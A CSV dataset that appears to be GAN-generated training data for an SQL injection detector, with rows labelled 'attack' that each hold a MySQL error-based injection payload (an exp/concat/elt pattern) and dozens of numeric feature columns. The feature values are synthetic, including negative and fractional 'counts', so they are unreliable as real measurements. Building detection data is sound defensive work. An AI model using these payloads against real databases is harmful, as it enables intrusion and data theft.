id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.694135402900972,257.8678283691406,74.55010986328125,35.964420318603516,103.66878509521484,1.6691477298736572,74.60570526123047,42.63191604614258,0.8273232579231262,0.27377232909202576,0.1576136201620102,0.3951115012168884,0.1294904500246048,3.7557692527770996,1.4933401346206665,0.9839357137680054,0.6656485199928284,0.13129454851150513,0.08965080976486206,0.09652674943208694,9.619943618774414,9.58837890625,3.0491344928741455,0.008841805160045624,1.8141711950302124,0.16203673183918,-0.0730457678437233,-0.09738612920045853,0.07950679212808609,0.660766065120697,-0.02254156768321991,-0.2693574130535126,1.6376852989196777,0.13690251111984253,0.35394322872161865,2.1009676456451416,7.569939136505127,0.977599024772644,2.024569272994995,0.0032623857259750366,0.46197745203971863,0.9242768883705139,-0.062127284705638885,0.04460882022976875,0.07825397700071335,-0.17365121841430664,0.04759451746940613,0.3890099823474884,0.5011169910430908,0.5725654363632202,0.19484218955039978,0.2967686355113983,0.14180830121040344,0.006928473711013794,0.1368725299835205,0.05718301981687546,0.06609256565570831,0.054961834102869034,0.031107120215892792,0.19538035988807678,-0.08250845968723297,0.029031910002231598,0.01929798722267151,0.03354383260011673,0.15819063782691956,-0.03652629256248474,0.44314488768577576,0.1643214374780655,0.18018227815628052,0.14434802532196045,-0.18671062588691711,-0.14225849509239197,0.17437228560447693,0.11804414540529251,0.05736914277076721,0.002100682118907571,1.4730372428894043,0.34939441084861755,-0.17315365374088287,0.022329717874526978,0.2344343513250351,7.835301876068115,0.9365220665931702,0.16342729330062866,0.022742442786693573,0.614255964756012,0.2243194580078125,0.08719803392887115,0.19437594711780548
GAN_000012,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.177363383634871,273.0608825683594,67.7874755859375,37.78989028930664,102.53794860839844,-0.4711720645427704,78.32949829101562,46.4247932434082,1.0956536531448364,0.24515116214752197,0.14712053537368774,0.4065871834754944,0.13178551197052002,3.6897501945495605,1.4879051446914673,1.5685657262802124,0.8853390216827393,0.18591751158237457,0.07056213170289993,0.04168356955051422,10.766409873962402,9.422823905944824,2.5294811725616455,0.05071210861206055,1.8844786882400513,0.20378699898719788,0.13393399119377136,-0.15697512030601501,0.07730518281459808,0.7835808992385864,-0.09015370905399323,-0.14307962357997894,1.392853856086731,0.26995888352394104,0.27678701281547546,2.231464385986328,6.901358604431152,0.6423649787902832,2.088376998901367,-0.012270331382751465,0.5756839513778687,1.1029499769210815,0.0968659371137619,0.0360383540391922,0.4042366147041321,-0.2385772168636322,-0.2692031264305115,0.5637786388397217,0.4217945635318756,0.6095359921455383,0.13732324540615082,0.4598748981952667,-0.09762733429670334,0.2837640941143036,0.14926524460315704,0.03168611228466034,0.06865504384040833,0.18411724269390106,0.035088829696178436,-0.041068099439144135,0.07596319168806076,0.20809602737426758,-0.2947726249694824,-0.09595440328121185,0.24079813063144684,-0.08022397756576538,0.4591646194458008,0.34640777111053467,0.19235390424728394,0.1432691216468811,-0.2539704740047455,-0.2751140892505646,-0.04692364111542702,0.20290684700012207,0.0968666523694992,0.021224740892648697,1.4011415243148804,0.13201482594013214,-0.2540932893753052,-0.04554160684347153,0.19700586795806885,7.930142879486084,0.9545326232910156,0.1926209181547165,-0.07049497216939926,0.5821731686592102,0.07898131012916565,0.27593904733657837,0.05614914000034332
GAN_000013,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.6989244737505995,256.0651550292969,72.23712158203125,37.023193359375,98.10746002197266,5.297215938568115,73.06873321533203,38.90823745727539,1.0883471965789795,0.3039660155773163,0.15666167438030243,0.40023159980773926,0.13001812994480133,3.7454943656921387,1.1427271366119385,0.8284589648246765,0.6325334906578064,0.1403355747461319,0.046170029789209366,0.05334274470806122,9.496132850646973,9.70020866394043,2.6820249557495117,0.10608431696891785,1.9873149394989014,0.14283618330955505,-0.033256419003009796,0.13449111580848694,0.06154441833496094,0.46744638681411743,0.05438748002052307,-0.1451685130596161,1.523960828781128,-0.0359390452504158,0.28131526708602905,2.2231435775756836,7.77199125289917,1.0252920389175415,2.024099826812744,0.18267926573753357,0.36093300580978394,0.9064551591873169,0.05379053205251694,0.04861585795879364,0.07886799424886703,-0.13393554091453552,-0.17520581185817719,0.4761502742767334,0.4087632894515991,0.44676631689071655,0.31374698877334595,0.2983623445034027,-0.1482730507850647,0.08200106024742126,0.20852024853229523,0.0687054768204689,0.06836105138063431,0.11483128368854523,-0.1213761568069458,0.13280344009399414,0.02393757551908493,-0.02112448960542679,-0.09063651412725449,0.06427141278982162,0.239259272813797,-0.039747752249240875,0.5445245504379272,0.0498616099357605,0.03672293573617935,0.01400359719991684,0.13474293053150177,-0.11978376656770706,0.05531562119722366,-0.04032345116138458,0.05777265876531601,0.012066671624779701,1.2095670700073242,0.40261587500572205,0.001666523516178131,0.11792951077222824,0.2033112645149231,8.086284637451172,0.7695009112358093,0.1522204577922821,0.02697923593223095,0.5923224687576294,-0.062267154455184937,-0.15920598804950714,-0.09160038828849792
GAN_000014,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.6958125174274095,255.37234497070312,72.12925720214844,37.88219451904297,101.61958312988281,3.7676875591278076,74.63262176513672,43.525665283203125,1.1127285957336426,0.26954415440559387,0.15108145773410797,0.3998908996582031,0.1301439255475998,3.696509599685669,1.3908318281173706,1.1323866844177246,0.8473111391067505,0.167952299118042,0.07956414669752121,-0.018595734611153603,9.619279861450195,9.62401008605957,2.610623359680176,0.12893186509609222,1.8614319562911987,0.1645069569349289,0.07114539295434952,-0.003003496676683426,0.0793478935956955,0.6938474774360657,0.004685655236244202,-0.07797938585281372,1.4729957580566406,0.2111709713935852,0.3237646520137787,2.219754695892334,7.397263526916504,0.7147589921951294,1.8880339860916138,0.01000957190990448,0.4950105845928192,0.9857015609741211,0.07298557460308075,0.030729619786143303,0.16923540830612183,-0.12096437811851501,-0.1655866652727127,0.4124232232570648,0.4441654682159424,0.4994400441646576,0.1085791364312172,0.368661493062973,-0.036439940333366394,0.1881653070449829,0.16703538596630096,0.053168781101703644,0.08750762045383453,0.17369432747364044,-0.04893527925014496,-0.007018744945526123,0.038154639303684235,0.09304691851139069,-0.10948815196752548,-0.007466893643140793,0.20825618505477905,-0.038690660148859024,0.5325861573219299,0.10767658054828644,0.1026751697063446,0.08838822692632675,-0.13390283286571503,-0.23106205463409424,-0.04539256915450096,0.23346227407455444,0.05040288344025612,0.01594366878271103,1.4509996175765991,0.2303287833929062,-0.13097050786018372,0.016943015158176422,0.15204204618930817,8.123663902282715,0.8235504031181335,0.14579705893993378,-0.02178964577615261,0.5833042860031128,0.049777477979660034,0.17599228024482727,-0.06459216773509979
GAN_000015,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.666142272648102,254.460205078125,71.36962127685547,37.30894088745117,102.03355407714844,3.457947015762329,77.04277038574219,43.70440673828125,1.1770389080047607,0.25616252422332764,0.1573297679424286,0.3920629024505615,0.13152499496936798,3.7123217582702637,1.490600824356079,0.8450816869735718,0.6754906177520752,0.13971534371376038,0.056111328303813934,0.22780746221542358,9.068949699401855,9.808032989501953,2.929004669189453,-0.009374924004077911,1.8369176387786865,0.13497838377952576,-0.24348458647727966,0.004188667982816696,0.003474472789093852,0.6102801561355591,-0.023149512708187103,-0.018898889422416687,1.4679148197174072,0.3451293110847473,0.39995184540748596,2.080291986465454,7.271539688110352,0.6106581091880798,1.6804720163345337,0.0813332349061966,0.4116102159023285,1.1304116249084473,-0.1577589213848114,0.0003678899956867099,0.022603824734687805,0.06770527362823486,-0.21600598096847534,0.4183691442012787,0.45907559990882874,0.45611119270324707,0.09642104059457779,0.3580648601055145,-0.10212864726781845,0.021298103034496307,0.19143113493919373,0.04336109757423401,0.025348849594593048,0.14999333024024963,0.14113643765449524,-0.05588141828775406,-0.09435176104307175,0.3695700764656067,0.03335390239953995,0.054510556161403656,0.16516733169555664,-0.1430702954530716,0.48979651927948,0.10993428528308868,0.28106066584587097,-0.007894247770309448,-0.10141357779502869,-0.15200121700763702,0.06907497346401215,0.33201056718826294,0.0430246964097023,0.013637937605381012,1.4478861093521118,0.23928625881671906,-0.20942507684230804,-0.042157791554927826,0.19121724367141724,7.999584674835205,0.918189525604248,0.2071741223335266,-0.04707736894488335,0.5094062685966492,-0.010282786563038826,0.3851065933704376,-0.09740415960550308
GAN_000016,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.781403306516488,257.4237976074219,68.489501953125,36.69647979736328,94.74740600585938,7.2401580810546875,78.19871520996094,41.031288146972656,0.9794933795928955,0.2806437611579895,0.15293428301811218,0.38957834243774414,0.12975731492042542,3.723578929901123,1.074617862701416,0.6876616477966309,0.607706606388092,0.11444780230522156,0.02283633127808571,-0.045203495770692825,9.286786079406738,9.77602767944336,2.18204665184021,0.16442382335662842,1.9881547689437866,0.15521711111068726,-0.05164751410484314,0.17050975561141968,0.04362936317920685,0.4973345100879669,-0.02869332581758499,-0.15058627724647522,1.5308141708374023,0.014525741338729858,0.27540045976638794,2.2967913150787354,7.751087665557861,0.9521222114562988,1.7709709405899048,0.08979438245296478,0.4338797926902771,1.0312812328338623,0.14070755243301392,0.021499624475836754,0.2558499574661255,-0.05849391222000122,-0.1058436781167984,0.4389938414096832,0.410543292760849,0.43365445733070374,0.2633124887943268,0.3441929817199707,-0.15389162302017212,0.15575572848320007,0.24491144716739655,0.05056637153029442,0.039713054895401,0.13452409207820892,-0.10802164673805237,0.26049646735191345,0.03248206526041031,-0.032774101942777634,-0.1148206815123558,0.12892964482307434,0.2500212788581848,0.05765115097165108,0.5270493626594543,-0.024151071906089783,0.044900499284267426,-0.07056023925542831,0.05701110512018204,-0.1944618970155716,0.004141610115766525,-0.05934341251850128,0.028616953641176224,0.017402585595846176,1.245973825454712,0.32155686616897583,-0.13088838756084442,0.1211603581905365,0.23100297152996063,8.311790466308594,0.783581554889679,0.18739987909793854,0.023157984018325806,0.5105892419815063,-0.17632699012756348,-0.16527891159057617,0.049299970269203186
GAN_000017,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",nearest_attack_euclidean,R000200,4.707688248661815,260.9156188964844,74.83465576171875,36.961090087890625,93.46021270751953,0.07232692837715149,71.30431365966797,43.061397552490234,1.314134120941162,0.2819128930568695,0.16408739984035492,0.4004749357700348,0.1301470696926117,3.700641393661499,1.3508855104446411,0.9833791255950928,0.7533875703811646,0.13509507477283478,0.060171883553266525,0.017122860997915268,10.426505088806152,9.259851455688477,2.817692518234253,-0.08425293117761612,1.8533310890197754,0.12930935621261597,0.06809322535991669,0.01925259456038475,0.013336117379367352,0.5775891542434692,-0.05875517427921295,-0.07439552247524261,1.524721384048462,0.08665331453084946,0.3792393207550049,2.2710788249969482,7.888513565063477,0.9589278697967529,2.1126673221588135,0.14779114723205566,0.4158840775489807,0.8354266285896301,-0.028324514627456665,0.024311402812600136,0.0179644376039505,-0.08005990087985992,-0.13238705694675446,0.4417741894721985,0.47087785601615906,0.45082855224609375,0.09746894985437393,0.25373750925064087,-0.13225698471069336,0.08866746723651886,0.1836540400981903,0.03381950780749321,0.08412259072065353,0.06509515643119812,-0.04647814482450485,0.2629321813583374,-0.06841927766799927,-0.05515770614147186,-0.15320360660552979,0.14454875886440277,0.2504408657550812,-0.07418829202651978,0.6440021991729736,-0.057091083377599716,0.0511823445558548,0.012335173785686493,0.17161525785923004,-0.15934468805789948,0.15780635178089142,0.09222549200057983,0.08973094820976257,0.005281008314341307,1.317556381225586,0.4373399019241333,-0.21404297649860382,0.05760150030255318,0.18111078441143036,7.61928653717041,0.8575406074523926,0.1876244992017746,0.0250066127628088,0.6313433647155762,0.10130630433559418,-0.14403218030929565,-0.06411481648683548
GAN_000018,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.0170541486058555,256.89910888671875,70.32038116455078,33.90549087524414,86.0755386352539,4.259463787078857,79.56902313232422,45.49849319458008,0.9586012363433838,0.2619002163410187,0.1564844846725464,0.38987013697624207,0.13100814819335938,3.6842997074127197,0.9660019874572754,0.7096782922744751,0.5677957534790039,0.11152764409780502,0.04264674335718155,0.07407931238412857,9.983365058898926,8.761919975280762,1.928179383277893,0.12835057079792023,1.812015414237976,0.17003309726715088,0.001966735813766718,0.070073701441288,0.006803749594837427,0.48813146352767944,-0.11578723788261414,-0.16719254851341248,1.4048603773117065,0.0913199633359909,0.29059457778930664,2.3544697761535645,7.789142608642578,0.8634796142578125,1.8535101413726807,0.0526513010263443,0.4814964532852173,1.1488817930221558,0.079556405544281,-0.003707562806084752,0.3731587529182434,-0.18713843822479248,-0.11619080603122711,0.5000700354576111,0.39575403928756714,0.46719375252723694,0.2095702886581421,0.28154897689819336,-0.30920636653900146,0.24122416973114014,0.25401052832603455,2.5402658138773404e-05,0.031658753752708435,0.16832098364830017,-0.0705631673336029,0.5446698069572449,0.027001015841960907,0.002544581890106201,-0.2880047559738159,0.22130171954631805,0.3569510579109192,0.10237057507038116,0.5085726976394653,0.05046696960926056,0.07292169332504272,-0.22763821482658386,0.09054027497768402,-0.307318776845932,0.05233067646622658,-0.06950031220912933,0.056322596967220306,0.017075108364224434,1.2729274034500122,0.2259976714849472,-0.22393576800823212,0.08324325829744339,0.2199222445487976,8.052633285522461,0.8998740315437317,0.22842559218406677,-0.007339213974773884,0.6077568531036377,-0.030596313998103142,-0.20730352401733398,0.050778716802597046
GAN_000019,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.889756099676933,257.8811340332031,65.44903564453125,37.010406494140625,100.725341796875,-0.38535186648368835,80.6375732421875,43.186981201171875,0.8316668272018433,0.27005401253700256,0.1530400812625885,0.39410313963890076,0.13316747546195984,3.749103307723999,1.3702154159545898,0.8515045642852783,0.5561842322349548,0.11909675598144531,0.06328197568655014,0.21611230075359344,9.703335762023926,9.727377891540527,2.798809766769409,0.03457358479499817,1.8025527000427246,0.1565691977739334,-0.09661223739385605,-0.06781596690416336,0.06520950794219971,0.6621106863021851,-0.03568488359451294,-0.3707391321659088,1.4984328746795654,0.17963150143623352,0.27576327323913574,2.171100616455078,7.711038112640381,0.8722251653671265,1.869079828262329,0.020627543330192566,0.483845591545105,1.0464695692062378,-0.013941168785095215,0.018618637695908546,0.32717978954315186,-0.17584842443466187,-0.06139936298131943,0.5126268863677979,0.5112074017524719,0.5746786594390869,0.26405900716781616,0.2690253257751465,-0.01570567488670349,-0.011391200125217438,0.14587505161762238,0.0241115540266037,0.035713035613298416,0.18454097211360931,-0.14995241165161133,0.3568863272666931,-0.06337110698223114,0.1464690864086151,-0.15541645884513855,-0.02418329380452633,0.22933584451675415,0.13994978368282318,0.35505902767181396,0.29368072748184204,0.16751286387443542,0.016124971210956573,-0.24023309350013733,-0.2199186235666275,0.17051008343696594,0.0005557388067245483,0.06789835542440414,0.008611141704022884,1.3696887493133545,0.208905890583992,-0.2067115753889084,0.09433095902204514,0.18996268510818481,7.835376262664795,0.9880879521369934,0.20582203567028046,-0.045534808188676834,0.5506505370140076,0.09668976068496704,0.058394961059093475,0.1078488826751709
GAN_000020,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.0720862683987535,252.7494659423828,69.03958892822266,35.27445602416992,98.92969512939453,1.0643608570098877,79.83831024169922,46.586978912353516,0.8236402273178101,0.24760425090789795,0.15401333570480347,0.3993838131427765,0.12955017387866974,3.756007194519043,1.3298064470291138,1.150582194328308,0.6706843376159668,0.14995965361595154,0.10679793357849121,0.07589752227067947,10.225262641906738,10.106178283691406,2.633558750152588,0.0038636475801467896,1.7833919525146484,0.21222849190235138,-0.06887976080179214,-0.14570099115371704,0.0789756029844284,0.8053794503211975,-0.0953003317117691,-0.2603423297405243,1.416451334953308,0.14791244268417358,0.37097078561782837,2.186596632003784,7.609426498413086,0.7406185865402222,1.9281306266784668,-0.13849008083343506,0.5895705819129944,1.0964597463607788,-0.047886334359645844,0.020072422921657562,0.2333909273147583,-0.13926735520362854,-0.0036284178495407104,0.482205867767334,0.5837195515632629,0.6483398675918579,0.10378868132829666,0.28510549664497375,0.13497580587863922,0.15266020596027374,0.17248806357383728,0.03802292048931122,0.021124422550201416,0.09966063499450684,0.0524238720536232,0.17577750980854034,0.09766022115945816,0.18702873587608337,-0.1798350214958191,0.018889036029577255,0.1760042905807495,-0.09194953739643097,0.37032949924468994,0.3202871084213257,0.23047485947608948,0.08456681668758392,-0.34927627444267273,-0.21066667139530182,0.21314099431037903,0.20187260210514069,0.04240752384066582,0.0027520149014890194,1.5820480585098267,0.19217196106910706,-0.3107743263244629,-0.03440053015947342,0.1947549730539322,7.838375568389893,1.0029007196426392,0.16954165697097778,-0.022230369970202446,0.5923380255699158,0.24122607707977295,0.29849791526794434,0.19645695388317108
GAN_000021,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.044234012314328,246.6361541748047,66.20036315917969,36.04073715209961,98.87882995605469,1.3543884754180908,82.49037170410156,48.64246368408203,0.7337258458137512,0.23989872634410858,0.15977631509304047,0.39694374799728394,0.12896807491779327,3.733773708343506,1.3704684972763062,0.9867962002754211,0.6410990953445435,0.17794357240200043,0.07435889542102814,0.10612863302230835,10.288758277893066,10.180831909179688,2.709015369415283,0.02306734025478363,1.7592246532440186,0.2229517549276352,-0.133208230137825,-0.12373340874910355,0.07405850291252136,0.7986876964569092,-0.15768791735172272,-0.31348347663879395,1.5680816173553467,0.13091307878494263,0.3440384864807129,2.3127317428588867,7.970273971557617,0.7784721851348877,1.9500586986541748,-0.1629263460636139,0.6110408902168274,1.110407829284668,0.010721765458583832,0.018604392185807228,0.4033487141132355,-0.15115663409233093,0.11160025000572205,0.44563212990760803,0.5697323083877563,0.6577014327049255,0.0734979584813118,0.23328012228012085,0.2486940622329712,0.07475745677947998,0.16000942885875702,0.03255254402756691,0.043547868728637695,0.12816324830055237,-0.02097923308610916,0.2287052869796753,0.09842728823423386,0.07201752066612244,-0.13745808601379395,0.06996554136276245,0.18794801831245422,-0.016825128346681595,0.3928358554840088,0.19210679829120636,0.2052069902420044,0.04165710508823395,-0.4293246567249298,-0.2155040055513382,0.17994695901870728,0.18063397705554962,0.04137927293777466,0.004701861646026373,1.7009152173995972,0.20582206547260284,-0.334122896194458,0.018034324049949646,0.2243155688047409,8.202317237854004,0.999352753162384,0.19133764505386353,-0.0260371845215559,0.557879626750946,0.21854275465011597,0.23469430208206177,0.293634831905365
GAN_000022,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.950636826283828,255.94932556152344,73.30603790283203,35.60466766357422,104.84208679199219,2.2005393505096436,76.39329528808594,44.9448127746582,1.0570659637451172,0.2628563642501831,0.1419370174407959,0.39632686972618103,0.13132527470588684,3.719330072402954,1.5975152254104614,1.1383368968963623,0.745190441608429,0.10601093620061874,0.049571819603443146,0.1579134613275528,10.681183815002441,9.21601390838623,3.057371139526367,0.06800016760826111,1.7717159986495972,0.14039526879787445,0.09671855717897415,-0.0536842979490757,-0.004367040004581213,0.7085639834403992,-0.18375931680202484,-0.11702428758144379,1.4106401205062866,0.2705935835838318,0.3623103201389313,2.103055238723755,6.850613594055176,0.5864205956459045,1.9885627031326294,0.04347743093967438,0.6144946813583374,1.1707628965377808,0.08970823884010315,0.0032772186677902937,0.2919207513332367,-0.027784287929534912,-0.24531103670597076,0.4842710793018341,0.4327143132686615,0.5683165788650513,0.07952839881181717,0.4461398720741272,0.021524138748645782,0.08240470290184021,0.2022334784269333,-0.01776333525776863,0.049972664564847946,-0.0662926584482193,0.148270845413208,0.20146474242210388,-0.05330153554677963,0.25056150555610657,-0.1779244840145111,-0.05425960198044777,0.2047204077243805,0.09727703034877777,0.44385701417922974,0.21183164417743683,0.2066969871520996,-0.06767011433839798,-0.2564782202243805,-0.31848543882369995,0.03140980005264282,0.13313385844230652,0.051116280257701874,0.013767379336059093,1.3645741939544678,0.14816704392433167,-0.31210029125213623,-0.04499337822198868,0.15987218916416168,7.850927829742432,0.9595553278923035,0.1724824458360672,-0.07110083848237991,0.5732674598693848,-0.0431613028049469,0.3171060383319855,0.05517815053462982
